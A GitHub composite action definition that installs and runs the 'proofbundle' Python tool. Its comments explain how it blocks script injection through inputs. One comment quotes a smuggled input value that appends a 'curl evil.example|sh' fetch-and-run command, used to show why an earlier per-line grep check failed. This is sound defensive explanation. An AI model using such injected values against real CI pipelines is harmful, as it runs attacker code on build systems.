name: "proofbundle"
description: "Install proofbundle and run it in CI (e.g. verify a receipt, or emit one from a test run)."
branding:
  icon: "check-circle"
  color: "green"

inputs:
  command:
    description: "proofbundle subcommand + args to run (e.g. 'verify receipt.json'). Empty = just install."
    required: false
    default: ""
  version:
    description: "proofbundle version specifier to install (e.g. '==1.0.0'). Empty = latest."
    required: false
    default: ""
  extras:
    description: "optional extras, e.g. 'eval' or 'eval,inspect'."
    required: false
    default: ""
  python-version:
    description: "Python version to set up."
    required: false
    default: "3.12"

runs:
  using: "composite"
  steps:
    - name: Set up Python
      uses: actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1  # v6.3.0
      with:
        python-version: ${{ inputs.python-version }}
    - name: Install proofbundle
      shell: bash
      # Both inputs travel through env, never through ${{ }} interpolation — the same
      # reason the run step below already gives, applied one step earlier. GitHub splices
      # an interpolated value into the script text BEFORE bash sees it, so a value
      # containing a quote or a semicolon becomes script. An env var is data.
      #
      # The shape check is the second half, and it is the one that survives a refactor:
      # a version specifier and an extras list have a form, and anything outside it is
      # refused rather than passed to pip. Without it, this step would be secure only for
      # as long as nobody rewrites it.
      #
      # THE CHECK ANCHORS TO THE WHOLE VALUE, and the first version of it did not. It read
      # `printf '%s' "$PB_VERSION" | grep -Eq '^...$'`, and grep anchors per LINE: a value whose
      # FIRST line matches passes, whatever stands below it. Measured, not assumed — with
      # PB_VERSION set to `==1.0.0` followed by a newline and `"; curl evil.example|sh #`, that
      # form returned 0 and let the value through, while the same pattern under a whole-string
      # matcher rejects it. Bash `[[ =~ ]]` matches the whole string, which is the form the
      # sibling step in .github/workflows/reusable-build-attest.yml already uses for its digest.
      #
      # The extras pattern now requires each name to START with an alphanumeric. The first one
      # allowed a leading hyphen, so `-e` and `eval,--no-deps` passed a check meant to admit
      # package extras. Neither is exploitable here, because the value only ever reaches pip
      # inside one quoted argument and pip rejects it — but a check that admits what it exists to
      # refuse is a check one refactor away from mattering.
      env:
        PB_VERSION: ${{ inputs.version }}
        PB_EXTRAS: ${{ inputs.extras }}
      run: |
        set -euo pipefail
        PB_VERSION_RE='^[=<>!~]{1,2}[A-Za-z0-9._*+!-]+$'
        PB_EXTRAS_RE='^[A-Za-z0-9][A-Za-z0-9._-]*(,[A-Za-z0-9][A-Za-z0-9._-]*)*$'
        if [ -n "$PB_VERSION" ] && ! [[ "$PB_VERSION" =~ $PB_VERSION_RE ]]; then
          echo "::error::version input is not a PEP 440 specifier: refusing to pass it to pip" >&2
          exit 1
        fi
        if [ -n "$PB_EXTRAS" ] && ! [[ "$PB_EXTRAS" =~ $PB_EXTRAS_RE ]]; then
          echo "::error::extras input is not a comma-separated list of names: refusing" >&2
          exit 1
        fi
        if [ -n "$PB_EXTRAS" ]; then
          spec="proofbundle[${PB_EXTRAS}]${PB_VERSION}"
        else
          spec="proofbundle${PB_VERSION}"
        fi
        python -m pip install --upgrade pip
        python -m pip install "$spec"
    - name: Run proofbundle
      if: ${{ inputs.command != '' }}
      shell: bash
      env:
        PB_COMMAND: ${{ inputs.command }}
      run: proofbundle $PB_COMMAND   # via env (not direct ${{ }} interpolation) to avoid script injection
